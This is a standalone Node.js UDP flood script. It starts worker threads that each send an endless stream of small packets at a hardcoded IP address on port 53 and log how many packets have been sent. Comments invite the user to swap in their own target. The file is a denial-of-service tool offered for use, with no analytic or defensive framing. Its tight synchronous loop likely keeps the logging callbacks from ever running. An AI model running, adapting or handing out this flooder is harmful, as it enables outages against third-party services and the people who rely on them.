const { Worker, isMainThread, workerData } = require('worker_threads');
const dgram = require('dgram');

const TARGET = '194.49.53.89';  // Change to your target IP
const PORT = 53;                // Change to your target port
const PACKET_SIZE = 32;           // Smaller packet size (to prevent overload)
const THREADS = 2;               // Number of worker threads (1 per vCPU)

if (isMainThread) {
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: { target: TARGET, port: PORT, size: PACKET_SIZE }
        });
    }
} else {
    const { target, port, size } = workerData;
    const socket = dgram.createSocket('udp4');
    const message = Buffer.alloc(size, 'A');  // Buffer with size `size`

    let packetsSent = 0;

    // Non-blocking function to send packets
    function flood() {
        while (true) {
            socket.send(message, 0, size, port, target, (err) => {
                if (!err) {
                    packetsSent++;
                    // Log packets sent every 10,000 packets
                    if (packetsSent % 10000 === 0) {
                        console.log(`Sent ${packetsSent} packets to ${target}:${port}`);
                    }
                }
            });
        }
    }

    flood();
}
